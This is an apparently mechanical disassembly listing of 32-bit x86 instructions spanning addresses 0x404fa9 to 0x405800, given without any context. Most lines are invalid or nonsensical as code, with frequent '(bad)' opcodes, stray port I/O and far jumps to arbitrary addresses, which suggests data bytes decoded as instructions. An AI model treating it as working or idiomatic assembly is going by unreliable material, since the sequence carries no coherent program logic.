  404fa9:	in     al,dx
  404faa:	lock xlat BYTE PTR ds:[ebx]
  404fac:	out    0x4,eax
  404fae:	lds    ecx,FWORD PTR [ebx]
  404fb0:	sar    bl,cl
  404fb2:	ror    cl,0x6
  404fb5:	enter  0xedc6,0x13
  404fb9:	repz scas al,BYTE PTR es:[edi]
  404fbb:	repz cmc 
  404fbd:	xlat   BYTE PTR ds:[ebx]
  404fbe:	stos   BYTE PTR es:[edi],al
  404fbf:	loop   0x404fa8
  404fc1:	xlat   BYTE PTR ds:[ebx]
  404fc2:	enter  0xfdf4,0xc4
  404fc6:	stc    
  404fc7:	cld    
  404fc8:	in     eax,dx
  404fc9:	out    dx,al
  404fca:	ror    ah,cl
  404fcc:	out    0xda,eax
  404fce:	aam    0xe4
  404fd0:	cld    
  404fd1:	retf   0xe405
  404fd4:	pop    es
  404fd5:	(bad)  
  404fd7:	add    al,cl
  404fd9:	in     eax,0xd7
  404fdb:	imul   DWORD PTR [eax-0x3d4a1d1d]
  404fe1:	mov    bh,0xf2
  404fe3:	mov    ch,0xf0
  404fe5:	in     eax,0xd6
  404fe7:	fdivr  QWORD PTR [eax-0x33202045]
  404fed:	repz (bad) 
  404fef:	clc    
  404ff0:	fmul   QWORD PTR [eax]
  404ff2:	in     al,0xd5
  404ff4:	(bad)  
  404ff5:	iret   
  404ff6:	(bad)  
  404ff7:	(bad)  
  404ff8:	in     al,dx
  404ff9:	ret    
  404ffa:	ffreep st(4)
  404ffc:	mov    al,0xea
  404ffe:	out    0xe8,al
  405000:	retf   0xeae4
  405003:	lock ror edx,1
  405006:	leave  
  405007:	fincstp 
  405009:	add    ecx,esi
  40500b:	rol    bh,cl
  40500d:	add    al,0xc7
  40500f:	loope  0x40501b
  405011:	add    dh,al
  405013:	add    cl,BYTE PTR [edi]
  405015:	ret    
  405016:	hlt    
  405017:	leave  
  405018:	adc    DWORD PTR [edx-0x13312f36],esi
  40501e:	aad    0xc8
  405020:	mov    cl,0xd1
  405022:	in     al,dx
  405023:	mov    edx,0xffd7eec9
  405028:	ret    
  405029:	into   
  40502a:	iret   
  40502b:	hlt    
  40502c:	repz fsub st,st(5)
  40502f:	cmc    
  405030:	hlt    
  405031:	fisttp DWORD PTR [eax]
  405033:	hlt    
  405034:	loope  0x40502b
  405036:	out    0xc,eax
  405038:	add    cl,ah
  40503a:	jecxz  0x405001
  40503c:	test   eax,0xd0b2add6
  405042:	(bad)  
  405043:	cmc    
  405044:	in     eax,0xb9
  405046:	(bad)  
  405048:	fst    st(4)
  40504a:	lock mul edi
  40504d:	add    al,0xd6
  40504f:	mov    esp,0xe6fef7d1
  405054:	jecxz  0x405052
  405056:	pop    es
  405057:	jecxz  0x40503c
  405059:	leave  
  40505a:	mov    dl,0xb7
  40505c:	cmc    
  40505d:	int    0xc5
  40505f:	mov    dl,0xe0
  405061:	repz fxch st(3)
  405064:	out    dx,al
  405065:	iret   
  405066:	fidivr WORD PTR [edx-0x5494050]
  40506c:	loope  0x405035
  40506e:	(bad)  
  40506f:	fdiv   st,st(1)
  405071:	lds    ecx,FWORD PTR [edi]
  405073:	inc    esp
  405075:	ret    
  405076:	loope  0x405043
  405078:	call   0xde181f62
  40507d:	out    dx,eax
  40507e:	out    dx,eax
  40507f:	out    dx,eax
  405080:	test   al,0xf6
  405082:	hlt    
  405083:	hlt    
  405084:	mov    ecx,0xdce8ddda
  405089:	enter  0xeede,0xf2
  40508d:	in     al,0xf5
  40508f:	cld    
  405090:	add    eax,0xe8c9dcfe
  405095:	out    0xca,al
  405097:	repz jmp ebx
  40509a:	mov    esi,0xf4eecfcc
  40509f:	mov    dl,0xe0
  4050a1:	into   
  4050a2:	shl    dh,cl
  4050a4:	(bad)  
  4050a5:	fcomi  st,st(4)
  4050a7:	out    dx,al
  4050a8:	fdivrp st(6),st
  4050aa:	sar    dl,0xf6
  4050ad:	add    eax,0xe5f6c4c3
  4050b2:	in     eax,0xd9
  4050b4:	(bad)  
  4050b6:	retf   
  4050b7:	fchs   
  4050b9:	fdivr  QWORD PTR [esi-0x2b110f52]
  4050bf:	mov    ah,0xf5
  4050c1:	shl    ah,1
  4050c3:	fcomip st,st(2)
  4050c5:	call   0xc01e2ec3
  4050ca:	iret   
  4050cb:	xlat   BYTE PTR ds:[ebx]
  4050cc:	out    0xc7,eax
  4050ce:	mov    edx,0xd8fcdce0
  4050d3:	fiadd  DWORD PTR [esi]
  4050d5:	retf   
  4050d6:	movlps xmm0,QWORD PTR [edx+eax*8]
  4050da:	jmp    0xcaf200b2
  4050df:	aad    0xe9
  4050e1:	fcmovnbe st,st(0)
  4050e3:	(bad)  
  4050e4:	in     al,dx
  4050e5:	mov    dh,0xbd
  4050e7:	mov    esp,0x6dee3f1
  4050ec:	stc    
  4050ed:	inc    BYTE PTR [ebx]
  4050ef:	fiadd  DWORD PTR [edx]
  4050f1:	fxtract 
  4050f3:	in     al,0x9
  4050f5:	fucomip st,st(4)
  4050f7:	pop    es
  4050f8:	out    dx,eax
  4050f9:	jecxz  0x4050e5
  4050fb:	jecxz  0x4050ac
  4050fd:	mov    dl,0xea
  4050ff:	fcmovnbe st,st(5)
  405101:	fcmovbe st,st(5)
  405103:	mov    cl,0xac
  405105:	fxch   st(3)
  405107:	fdiv   st,st(7)
  405109:	int3   
  40510a:	loope  0x4050ce
  40510c:	fcomip st,st(3)
  40510e:	out    0xf0,al
  405110:	aam    0xdc
  405112:	clc    
  405113:	jmp    0x4050dc
  405115:	(bad)  
  405116:	fucom  st(6)
  405118:	leave  
  405119:	lock test eax,0xcce1b0d7
  40511f:	fidivr DWORD PTR [ebx-0x21354a47]
  405125:	in     eax,0xb9
  405127:	mov    ebx,0xd5fffbc9
  40512c:	add    bh,dh
  40512e:	hlt    
  40512f:	rol    edx,0xe7
  405132:	fndisi(8087 only) 
  405134:	add    DWORD PTR ds:0xab03fff9,eax
  40513a:	shr    BYTE PTR [edi-0x4f151050],1
  405140:	fcmovne st,st(5)
  405142:	stc    
  405143:	in     al,0xd0
  405145:	int3   
  405146:	repz iret 
  405148:	repz add al,dl
  40514b:	out    0xf3,al
  40514d:	(bad)  
  40514e:	fdivrp st(0),st
  405150:	std    
  405151:	lock fmul st(1),st
  405154:	add    al,0xc8
  405156:	(bad)  
  405158:	retf   
  405159:	stos   BYTE PTR es:[edi],al
  40515a:	lods   eax,DWORD PTR ds:[esi]
  40515b:	(bad)  
  40515d:	mov    dh,0xcc
  40515f:	shl    esp,cl
  405161:	icebp  
  405162:	mov    eax,0xfcb6f8b0
  405167:	mov    edi,0xf7eed0c2
  40516c:	ret    
  40516d:	aam    0xd8
  40516f:	out    0xc7,al
  405171:	retf   
  405172:	(bad)  
  405173:	in     eax,0xe2
  405175:	int    0x5
  405177:	push   cs
  405178:	(bad)  
  405179:	fxch   st(0)
  40517b:	(bad)  
  40517c:	fstp   st(4)
  40517e:	enter  0xefda,0xb9
  405182:	mov    dl,0xbf
  405184:	out    dx,al
  405185:	sti    
  405186:	aam    0xe2
  405188:	retf   0xd4f7
  40518b:	ret    0xbd01
  40518e:	(bad)
  405191:	(bad)  
  405192:	(bad)  
  405193:	iret   
  405194:	loopne 0x405175
  405196:	hlt    
  405197:	loope  0x40519f
  405199:	loopne 0x40515d
  40519b:	fmulp  st(0),st
  40519d:	leave  
  40519e:	int3   
  40519f:	icebp  
  4051a0:	ror    ah,1
  4051a2:	fbstp  TBYTE PTR [edi-0x40170350]
  4051a8:	neg    edx
  4051aa:	cld    
  4051ab:	mov    ecx,0xe4e5fffc
  4051b0:	rcl    al,1
  4051b2:	leave  
  4051b3:	hlt    
  4051b4:	clc    
  4051b5:	cmc    
  4051b6:	fninit 
  4051b8:	jmp    0xe80c04ab
  4051bd:	out    0xcd,al
  4051bf:	hlt    
  4051c0:	cmc    
  4051c1:	stc    
  4051c2:	jmp    0xd8fc48bb
  4051c7:	fucomip st,st(5)
  4051c9:	aam    0xd9
  4051cb:	hlt    
  4051cc:	loope  0x4051c4
  4051ce:	xlat   BYTE PTR ds:[ebx]
  4051cf:	cld    
  4051d0:	lock add bl,ah
  4051d3:	or     dl,dh
  4051d5:	mov    ah,0xd8
  4051d8:	or     bl,bh
  4051da:	jmp    0xc62442c5
  4051df:	shr    al,cl
  4051e1:	rcl    bh,1
  4051e3:	rcr    ebx,1
  4051e5:	in     al,dx
  4051e6:	add    eax,DWORD PTR [ebx]
  4051e8:	mov    al,0xbc
  4051ea:	into   
  4051eb:	cld    
  4051ec:	xlat   BYTE PTR ds:[ebx]
  4051ed:	sar    DWORD PTR [ebx+edi*8+0xfcae4ff],1
  4051f4:	jmp    0x4051f3
  4051f6:	jmp    0x4051e1
  4051f8:	or     eax,0xbec5e9ac
  4051fd:	lods   al,BYTE PTR ds:[esi]
  4051fe:	mov    al,0xfa
  405200:	jmp    0xbdcd:0xdae8c8f9
  405207:	mov    edx,0xfabdfdf6
  40520c:	xlat   BYTE PTR ds:[ebx]
  40520d:	fnsetpm(287 only) 
  40520f:	les    eax,FWORD PTR [ebx]
  405211:	mov    edi,0xd8e5ebdb
  405216:	int3   
  405217:	call   0xde2c0403
  40521c:	enter  0xf3d4,0xd5
  405220:	mov    edx,0xdaf8dad7
  405225:	lock icebp 
  405227:	leave  
  405228:	enter  0xd5e8,0xdc
  40522c:	stc    
  40522d:	add    al,0xeb
  40522f:	(bad)  
  405230:	aad    0xe0
  405232:	out    0xdb,al
  405234:	retf   
  405235:	into   
  405236:	int3   
  405237:	out    0x7,eax
  405239:	repz ret 0xacb0
  40523d:	enter  0xfbc4,0xef
  405241:	jmp    0xd7ee:0xb3e9e5c0
  405248:	(bad)  
  40524a:	aam    0x2
  40524c:	rol    BYTE PTR [esi],cl
  40524e:	fcmovnb st,st(0)
  405250:	retf   
  405251:	or     BYTE PTR [esi+ebp*8],al
  405254:	fld    st(4)
  405256:	iret   
  405257:	or     al,0xeb
  405259:	(bad)  
  40525a:	repz sar DWORD PTR [esp+edi*4-0x443d2f2c],0xd6
  405263:	(bad)  
  405264:	int    0xda
  405266:	lock leave 
  405268:	sti    
  405269:	out    dx,al
  40526a:	mov    dh,0xc7
  40526c:	(bad)  
  40526d:	fsubr  st,st(3)
  40526f:	repz mov esp,0xd6dac9e0
  405275:	out    0x3,eax
  405277:	(bad)  
  405278:	repz fsubr DWORD PTR [ecx-0x34093d57]
  40527f:	lods   eax,DWORD PTR ds:[esi]
  405280:	in     al,dx
  405281:	frstpm(287 only) 
  405283:	call   0xe4144b60
  405288:	mov    ebx,0xddc1e2f7
  40528d:	mov    ebp,0xc4f8c1db
  405292:	add    cl,bh
  405294:	add    cl,BYTE PTR [ecx]
  405296:	add    eax,DWORD PTR [esi]
  405298:	or     cl,ah
  40529a:	int    0xe3
  40529c:	iret   
  40529d:	div    al
  40529f:	in     al,dx
  4052a0:	aad    0xc6
  4052a2:	mov    ebx,0xf0d9acd7
  4052a7:	mov    ebp,0xd0ddeeec
  4052ac:	loope  0x4052b1
  4052ae:	repz std 
  4052b0:	(bad)  
  4052b2:	hlt    
  4052b3:	div    esi
  4052b5:	jmp    0x4052c2
  4052b7:	in     al,dx
  4052b8:	pop    es
  4052b9:	fsub   st,st(4)
  4052bb:	icebp  
  4052bc:	ret    
  4052bd:	mov    esp,0xd8f6c1c4
  4052c2:	out    0xc6,eax
  4052c4:	retf   0xb6c8
  4052c7:	hlt    
  4052c8:	add    ch,ah
  4052ca:	ret    
  4052cb:	not    edx
  4052cd:	clc    
  4052ce:	loope  0x4052d4
  4052d0:	std    
  4052d1:	sti    
  4052d2:	call   0xce0a3dd8
  4052d7:	in     eax,0xee
  4052d9:	mov    dl,0xaa
  4052db:	(bad)  
  4052dc:	int3   
  4052dd:	out    0xae,al
  4052df:	lock in al,dx
  4052e1:	in     al,0xd8
  4052e3:	mov    al,0xcf
  4052e5:	in     eax,dx
  4052e6:	clc    
  4052e7:	ret    
  4052e8:	clc    
  4052e9:	cli    
  4052ea:	div    edi
  4052ec:	cld    
  4052ed:	cli    
  4052ee:	icebp  
  4052ef:	cli    
  4052f0:	ret    
  4052f1:	out    0x7,eax
  4052f3:	or     ecx,esp
  4052f5:	sti    
  4052f6:	hlt    
  4052f7:	fld    DWORD PTR ds:0xddb7e9c6
  4052fd:	mov    dl,0xe7
  4052ff:	shr    BYTE PTR [edx+ebp*8-0x362c0a34],0xbb
  405307:	fidivr WORD PTR [eax+edx*8-0x9072614]
  40530e:	int3   
  40530f:	pop    es
  405310:	(bad)  
  405312:	aam    0xf
  405314:	cld    
  405315:	stc    
  405316:	or     ebx,ecx
  405318:	in     al,0xee
  40531a:	in     eax,0xdd
  40531c:	int    0xad
  40531e:	retf   0xbaca
  405321:	rol    esi,0xd5
  405324:	mov    bh,0xf1
  405326:	cli    
  405327:	aam    0xc9
  405329:	shl    edi,1
  40532b:	jecxz  0x4052fb
  40532d:	add    dh,ah
  40532f:	fyl2xp1 
  405331:	(bad)  
  405333:	or     ah,dh
  405335:	push   cs
  405336:	fsub   st,st(4)
  405338:	loope  0x40531a
  40533a:	enter  0xf7e7,0xb6
  40533e:	in     al,dx
  40533f:	repnz mov ch,0xd5
  405342:	(bad)  
  405344:	ror    ah,1
  405346:	repz fnstcw WORD PTR [ecx-0x1d0d2743]
  40534d:	loop   0x40535a
  40534f:	rcr    ebx,1
  405351:	add    eax,0xa0bc7dc
  405356:	in     eax,0xe5
  405358:	in     al,0xac
  40535a:	(bad)
  40535d:	loop   0x405321
  40535f:	mov    bh,0xd9
  405361:	enter  0xd2ff,0xde
  405365:	in     eax,0xb6
  405367:	retf   
  405368:	enter  0xf8b9,0xe3
  40536c:	(bad)  
  40536d:	(bad)  
  40536f:	repnz fcmovnb st,st(7)
  405372:	ret    0xdfc4
  405375:	or     ebp,ecx
  405377:	(bad)  
  405379:	fstp   st(0)
  40537b:	test   cl,0xf1
  40537e:	call   0xbb221b76
  405383:	in     eax,0xe6
  405385:	mov    dh,0xeb
  405387:	fadd   DWORD PTR [ebx]
  405389:	repnz mov eax,0xd403dfda
  40538f:	(bad)  
  405391:	(bad)
  405394:	(bad)  
  405395:	retf   
  405396:	or     al,0xc
  405398:	fst    st(1)
  40539a:	mov    bl,0xe6
  40539c:	mov    bh,0xaf
  40539e:	int    0xec
  4053a0:	shl    BYTE PTR [ebx-0x3174710],1
  4053a6:	call   0xd0184964
  4053ab:	in     al,dx
  4053ac:	aam    0x6
  4053ae:	out    0x6,al
  4053b0:	dec    edx
  4053b2:	xlat   BYTE PTR ds:[ebx]
  4053b3:	fld    DWORD PTR [edx]
  4053b5:	or     eax,0xebcfe1e1
  4053ba:	mov    al,0xf0
  4053bc:	ret    0xfbc9
  4053bf:	(bad)  
  4053c0:	out    dx,al
  4053c1:	out    dx,al
  4053c2:	leave  
  4053c3:	sar    bh,1
  4053c5:	not    al
  4053c7:	clc    
  4053c8:	enter  0xba03,0xee
  4053cc:	cld    
  4053cd:	stc    
  4053ce:	add    eax,DWORD PTR [ecx]
  4053d0:	inc    DWORD PTR [ebx]
  4053d2:	enter  0x4fc,0xc9
  4053d6:	in     al,0xd8
  4053d8:	(bad)  [edx-0x3c1c1b0f]
  4053de:	(bad)  
  4053df:	cli    
  4053e0:	sti    
  4053e1:	(bad)  
  4053e2:	retf   
  4053e3:	leave  
  4053e4:	push   ebp
  4053e6:	rcr    al,1
  4053e8:	cmc    
  4053e9:	fdivrp st(4),st
  4053eb:	pop    es
  4053ec:	in     al,dx
  4053ed:	fucomi st,st(4)
  4053ef:	or     al,BYTE PTR [edx]
  4053f1:	fimul  DWORD PTR [edx]
  4053f3:	enter  0xbf6,0xdc
  4053f7:	into   
  4053f8:	add    bh,BYTE PTR [esi-0xb2e1958]
  4053fe:	ret    0xb7e4
  405401:	mov    bh,0xce
  405403:	mov    eax,0xe2c8fcd6
  405408:	repz bnd ret 0xf4f7
  40540d:	icebp  
  40540e:	ffree  st(6)
  405410:	add    dl,bh
  405412:	clts   
  405414:	or     esp,edi
  405416:	or     al,0xa
  405418:	add    ebp,edx
  40541a:	fbstp  TBYTE PTR [ebx-0x15310c0a]
  405420:	mov    ebx,0xc5c8e5f7
  405425:	cli    
  405426:	clc    
  405427:	out    dx,al
  405428:	cmc    
  405429:	int3   
  40542a:	ret    
  40542b:	(bad)  
  40542c:	fstp   TBYTE PTR [esi+0xad6e3e2]
  405432:	std    
  405433:	(bad)  
  405435:	(bad)  
  405436:	aam    0xca
  405438:	pop    es
  405439:	(bad)  
  40543a:	fbstp  TBYTE PTR [edx-0x4122e40]
  405440:	mov    bh,0xc6
  405442:	shl    ebx,1
  405444:	out    dx,eax
  405445:	div    cl
  405447:	ror    ch,cl
  405449:	add    DWORD PTR [ebx],eax
  40544b:	shl    esi,cl
  40544d:	add    ebp,ebx
  40544f:	loope  0x40542b
  405451:	std    
  405452:	(bad)  
  405453:	or     eax,DWORD PTR [edi]
  405455:	fsubp  st(6),st
  405457:	jecxz  0x405458
  405459:	scas   al,BYTE PTR es:[edi]
  40545a:	in     eax,0xdd
  40545c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40545d:	ret    
  40545e:	cmc    
  40545f:	lods   al,BYTE PTR ds:[esi]
  405460:	lock xlat BYTE PTR ds:[ebx]
  405462:	fsub   st,st(6)
  405464:	fdivp  st(0),st
  405466:	dec    dl
  405468:	mov    ebx,0xc0db07ed
  40546d:	hlt    
  40546e:	lock ret 
  405470:	shr    dl,0x7
  405473:	aad    0xd9
  405475:	add    esi,eax
  405477:	loop   0x405462
  405479:	call   0xc2f02630
  40547e:	in     eax,0xe4
  405480:	(bad)  
  405481:	not    edx
  405483:	iret   
  405484:	in     eax,dx
  405485:	retf   0xb8d7
  405488:	mov    al,0x2
  40548a:	(bad)  
  40548c:	std    
  40548d:	in     al,0xf2
  40548f:	jecxz  0x405465
  405491:	(bad)
  405495:	call   0xed1932ad
  40549a:	loopne 0x40548a
  40549c:	mov    al,0xae
  40549e:	enter  0xeab5,0xc8
  4054a2:	mov    dl,0xf9
  4054a4:	repz mov edx,0xf102bfed
  4054aa:	mov    eax,0xd9d6f4ce
  4054af:	loop   0x405476
  4054b1:	add    cl,BYTE PTR [edx]
  4054b3:	fadd   DWORD PTR [esi+edi*8]
  4054b6:	leave  
  4054b7:	repnz jecxz 0x40549a
  4054ba:	shl    BYTE PTR [ebx-0xb51150f],cl
  4054c0:	test   al,0xee
  4054c2:	aam    0xf7
  4054c4:	mov    edi,0xd3fabeed
  4054c9:	enter  0xd3f0,0xec
  4054cd:	fadd   st(5),st
  4054cf:	loopne 0x4054ab
  4054d1:	add    al,0xf8
  4054d3:	jmp    0xf92f18ce
  4054d8:	or     edx,ecx
  4054da:	into   
  4054db:	enter  0xdcdc,0xc5
  4054df:	mul    ah
  4054e1:	mov    ebx,0xbed8dff6
  4054e6:	mov    ebp,0xdbd0ccf5
  4054eb:	shl    ch,0xcd
  4054ee:	mov    esi,0xe2e3e7e6
  4054f3:	(bad)  [ebx]
  4054f5:	fld    st(4)
  4054f7:	loopne 0x4054e0
  4054f9:	into   
  4054fa:	stos   BYTE PTR es:[edi],al
  4054fb:	repz mov dh,0xe9
  4054fe:	out    dx,al
  4054ff:	call   0xca173dce
  405504:	mov    ch,0xe9
  405506:	repnz fdiv QWORD PTR [eax+0x601d6bd]
  40550d:	fdiv   st(5),st
  40550f:	loop   0x40550c
  405511:	std    
  405512:	push   es
  405513:	loop   0x4054ee
  405515:	jmp    0x4054ef
  405517:	pop    es
  405518:	int    0xec
  40551a:	xlat   BYTE PTR ds:[ebx]
  40551b:	iret   
  40551c:	xlat   BYTE PTR ds:[ebx]
  40551d:	shl    ebp,1
  40551f:	hlt    
  405520:	rcr    ecx,0xe0
  405523:	mov    ah,0xd4
  405525:	fsub   st(3),st
  405527:	jmp    0x4054e1
  405529:	mov    eax,0x7d0bebf
  40552e:	add    eax,0xdac9c1d4
  405533:	or     esi,ebx
  405535:	loop   0x405515
  405537:	clc    
  405538:	or     dh,bl
  40553a:	scas   eax,DWORD PTR es:[edi]
  40553b:	scas   al,BYTE PTR es:[edi]
  40553c:	out    0xcb,al
  40553e:	repnz retf 
  405540:	fxch   st(6)
  405542:	in     eax,dx
  405543:	rcl    ecx,1
  405545:	repnz (bad) 
  405547:	mov    ah,0xc8
  405549:	in     al,dx
  40554a:	hlt    
  40554b:	(bad)  
  40554d:	in     eax,0xf9
  40554f:	fadd   st,st(6)
  405551:	fsubr  st(6),st
  405553:	or     BYTE PTR [esi],cl
  405555:	loope  0x405522
  405557:	int    0xe7
  405559:	(bad)  
  40555b:	retf   
  40555c:	rol    dh,0xc0
  40555f:	test   esi,0xc4f9b6b3
  405565:	retf   0xf7d0
  405568:	add    ebx,eax
  40556a:	out    0xd7,eax
  40556c:	pop    es
  40556d:	rol    DWORD PTR [edi+eax*1],cl
  405570:	test   ebx,0x8da0b08
  405576:	cli    
  405577:	or     eax,0xc9ecad0c
  40557c:	(bad)  
  40557d:	mov    esp,0xf5c4c5c3
  405582:	test   al,0xf0
  405585:	stc    
  405586:	mov    esi,0xc1ffc9f8
  40558b:	rcr    esp,cl
  40558d:	jmp    esp
  40558f:	add    al,0xd0
  405591:	retf   0xeed8
  405594:	fiadd  WORD PTR [esi]
  405596:	int3   
  405597:	(bad)  
  405598:	icebp  
  405599:	(bad)  
  40559b:	mov    edi,0xd7f0eceb
  4055a0:	repnz ror bl,cl
  4055a3:	jmp    0xee344882
  4055a8:	cli    
  4055a9:	(bad)  
  4055aa:	(bad)  
  4055ab:	loope  0x405573
  4055ad:	fnstsw ax
  4055af:	retf   
  4055b0:	retf   0xc60a
  4055b3:	enter  0x9c8,0xfb
  4055b7:	cli    
  4055b8:	fnstcw WORD PTR [eax-0x16093857]
  4055be:	div    ch
  4055c0:	in     al,dx
  4055c1:	mov    edx,0xbee9e8df
  4055c6:	jecxz  0x405580
  4055c8:	out    dx,eax
  4055c9:	sti    
  4055ca:	aad    0xc1
  4055cc:	std    
  4055cd:	rcr    bl,0x1
  4055d0:	aam    0x1
  4055d2:	les    ecx,FWORD PTR [esi]
  4055d4:	out    0xf8,eax
  4055d6:	or     ebp,ebp
  4055d8:	iret   
  4055d9:	out    0xe1,eax
  4055db:	in     al,0xd1
  4055dd:	out    0xc3,eax
  4055df:	xlat   BYTE PTR ds:[ebx]
  4055e0:	in     al,dx
  4055e1:	in     al,dx
  4055e2:	int    0xe9
  4055e4:	fst    st(1)
  4055e6:	repz int3 
  4055e8:	xlat   BYTE PTR ds:[ebx]
  4055e9:	not    ah
  4055eb:	in     al,dx
  4055ec:	idiv   ebx
  4055ee:	mov    esi,0xddf6e3ff
  4055f3:	fucomp st(7)
  4055f5:	(bad)  
  4055f7:	jmp    0x4055e8
  4055f9:	lods   al,BYTE PTR ds:[esi]
  4055fa:	int3   
  4055fb:	shl    esi,1
  4055fd:	jmp    0xc9f3:0xb6b4c6d5
  405604:	mov    al,0xdb
  405606:	retf   
  405607:	mov    ebp,0xf3fbf3d9
  40560c:	add    esp,ecx
  40560e:	test   BYTE PTR [edi],0xda
  405611:	test   DWORD PTR [eax],0xe2eaebfb
  405617:	(bad)  
  405618:	jmp    0xb31108de
  40561d:	jmp    0xda141dfd
  405622:	scas   al,BYTE PTR es:[edi]
  405623:	enter  0xfdfb,0xc8
  405627:	mov    esi,0xfad2f5b8
  40562c:	xlat   BYTE PTR ds:[ebx]
  40562d:	(bad)  
  40562e:	int3   
  40562f:	(bad)  
  405631:	loop   0x40563c
  405633:	iret   
  405634:	pmuludq mm5,mm6
  405637:	clc    
  405638:	fucomip st,st(0)
  40563a:	shr    BYTE PTR [ebp-0x381e5232],1
  405640:	(bad)  
  405641:	mov    al,0xb6
  405643:	test   bl,0xf7
  405646:	repz fsqrt 
  405649:	mov    esp,0xdbffbfd1
  40564e:	jmp    0x405616
  405650:	(bad)  
  405652:	jmp    0xdd393e58
  405657:	out    0xfa,al
  405659:	iret   
  40565a:	mov    edi,0xf7acedd3
  40565f:	jmp    0x40565a
  405661:	in     eax,0xf8
  405663:	in     eax,dx
  405664:	in     eax,dx
  405665:	shr    esi,cl
  405667:	out    dx,al
  405668:	iret   
  405669:	test   DWORD PTR [edx],0xd3ddb8be
  40566f:	sti    
  405670:	cmc    
  405671:	ret    
  405672:	shl    ch,0x3
  405675:	call   0xa94a5b8d
  40567a:	mov    dl,0xbe
  40567c:	icebp  
  40567d:	hlt    
  40567e:	enter  0xfaec,0xcf
  405682:	lock out 0xfd,eax
  405685:	retf   0xf8fe
  405688:	clc    
  405689:	mov    ebp,0x3dbd8c2
  40568e:	(bad)
  405691:	cli    
  405692:	lar    eax,WORD PTR [edx+eax*1]
  405696:	in     al,0xc8
  405698:	or     ch,BYTE PTR [esi-0x2f0a3c36]
  40569e:	loopne 0x40568f
  4056a0:	mov    dh,0xcc
  4056a2:	in     eax,0xfb
  4056a4:	shl    DWORD PTR [ebp+0x3d4f7dd],1
  4056aa:	cli    
  4056ab:	loope  0x40568a
  4056ad:	fiadd  DWORD PTR [ebx]
  4056af:	repnz fadd QWORD PTR [eax]
  4056b2:	out    0xc8,eax
  4056b4:	jmp    0x4056c0
  4056b6:	fmul   st(0),st
  4056b8:	jmp    0xe733359e
  4056bd:	hlt    
  4056be:	in     eax,dx
  4056bf:	repz int3 
  4056c1:	mov    ah,0xd8
  4056c3:	mov    eax,0xecd4f3f8
  4056c8:	out    dx,eax
  4056c9:	int3   
  4056ca:	aam    0xbe
  4056cc:	add    dl,cl
  4056ce:	add    eax,0xfa05d5ea
  4056d3:	in     eax,0xdc
  4056d5:	fadd   st(5),st
  4056d7:	loop   0x4056b9
  4056d9:	in     al,dx
  4056da:	shl    edx,0xc8
  4056dd:	(bad)  
  4056de:	jmp    0xd6f4:0xdfd0c2f7
  4056e5:	(bad)  
  4056e6:	mov    edi,0xefcfd8e8
  4056eb:	jmp    edi
  4056ed:	in     al,0xd8
  4056ef:	mov    ecx,0x6dec3eb
  4056f4:	fcmove st,st(7)
  4056f6:	aam    0xd8
  4056f8:	out    dx,eax
  4056f9:	(bad)  
  4056fb:	mov    bl,0xc8
  4056fd:	call   0xfc291aaf
  405702:	int    0xb0
  405704:	mov    ebx,0xc3f4f3ff
  405709:	cli    
  40570a:	fadd   st,st(1)
  40570c:	aam    0xfe
  40570e:	push   ebx
  405710:	icebp  
  405711:	push   es
  405712:	pop    es
  405713:	aad    0xbc
  405715:	fucomi st,st(2)
  405717:	(bad)
  40571a:	ret    
  40571b:	ret    
  40571c:	in     al,dx
  40571d:	shr    ah,1
  40571f:	mov    cl,0xf4
  405721:	(bad)  
  405722:	stc    
  405723:	into   
  405724:	out    dx,al
  405725:	fcmove st,st(5)
  405727:	mov    ebx,0xd0f1f6f9
  40572c:	mov    ah,0xe2
  40572e:	mov    esp,0xd4f504eb
  405733:	jmp    0xc63e3217
  405738:	fsubr  DWORD PTR [edx-0x1b112e09]
  40573e:	mov    cl,0xed
  405740:	rol    cl,1
  405742:	enter  0xceed,0xf5
  405746:	mov    ebp,0xbf01c2c8
  40574b:	fstp   TBYTE PTR [eax-0x38191406]
  405751:	cli    
  405752:	fsubr  st,st(1)
  405754:	retf   
  405755:	ffreep st(4)
  405757:	add    eax,0xc4b2d800
  40575c:	(bad)  
  40575d:	scas   eax,DWORD PTR es:[edi]
  40575e:	loope  0x40572e
  405760:	sti    
  405761:	xlat   BYTE PTR ds:[ebx]
  405762:	imul   bl
  405764:	std    
  405765:	fmulp  st(2),st
  405767:	fild   DWORD PTR [edx]
  405769:	lock (bad) 
  40576b:	into   
  40576c:	(bad)  
  40576d:	mov    esp,0x1c7ffc1
  405772:	fucomp st(3)
  405774:	(bad)  
  405776:	iret   
  405777:	in     al,dx
  405778:	icebp  
  405779:	mov    esi,0xf7c5e5bd
  40577e:	leave  
  40577f:	mov    bh,0xcb
  405781:	(bad)  
  405782:	int    0xb1
  405784:	stc    
  405785:	sti    
  405786:	call   0xf9351b7f
  40578b:	shl    ebx,cl
  40578d:	fsubp  st(4),st
  40578f:	add    eax,ebx
  405791:	cld    
  405792:	(bad)  
  405794:	loop   0x40579c
  405796:	jecxz  0x40577f
  405798:	clc    
  405799:	retf   
  40579a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579b:	fucomp st(7)
  40579d:	into   
  40579e:	jmp    0x405784
  4057a0:	rcl    al,0xee
  4057a3:	mov    ebx,0xb8cfe9ea
  4057a8:	sar    DWORD PTR [ebp-0x410cf81f],cl
  4057ae:	stc    
  4057af:	loope  0x4057b2
  4057b1:	retf   0xe5d5
  4057b4:	aad    0xd
  4057b6:	jmp    0x4057bb
  4057b8:	out    0xaa,al
  4057ba:	in     al,dx
  4057bb:	(bad)  
  4057bc:	out    dx,eax
  4057bd:	repz in eax,0xf4
  4057c0:	(bad)
  4057c3:	leave  
  4057c4:	(bad)  
  4057c5:	aam    0xbf
  4057c7:	jmp    0x405796
  4057c9:	out    dx,eax
  4057ca:	loop   0x4057bb
  4057cc:	(bad)  
  4057cd:	rol    BYTE PTR ds:0xeac3f7db,1
  4057d3:	fsub   st,st(7)
  4057d5:	or     ecx,esp
  4057d7:	int3   
  4057d8:	jmp    0xefd7:0xa4d7ecca
  4057df:	hlt    
  4057e0:	aam    0xf8
  4057e2:	out    0xad,eax
  4057e4:	idiv   bh
  4057e6:	(bad)  
  4057e7:	cmc    
  4057e8:	loop   0x4057c9
  4057ea:	loope  0x4057ee
  4057ec:	(bad)  
  4057ee:	rcl    ecx,cl
  4057f0:	div    cl
  4057f2:	in     al,0x3
  4057f4:	out    0xe0,al
  4057f6:	(bad)  
  4057f8:	push   es
  4057f9:	into   
  4057fa:	shl    al,cl
  4057fc:	ret    0xdbc4
  4057ff:	ret    
  405800:	shl    edi,cl
